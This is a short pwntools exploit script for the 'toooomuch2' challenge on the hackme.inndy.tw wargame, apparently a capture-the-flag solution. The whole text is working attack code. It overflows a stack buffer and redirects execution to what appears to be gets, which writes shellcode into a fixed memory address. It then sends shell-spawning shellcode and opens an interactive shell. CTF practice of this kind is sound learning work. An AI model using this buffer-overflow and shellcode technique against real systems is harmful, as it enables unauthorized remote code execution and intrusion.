from pwn import *
io=remote("hackme.inndy.tw",7702)
context.binary=("./toooomuch2")

payload=(0x18+4)*'a'+p32(0x8048480)+p32(0x8049C60)+p32(0x8049C60)
io.sendlineafter("Give me your passcode: ",payload)
io.sendline(asm(shellcraft.sh()))
io.interactive()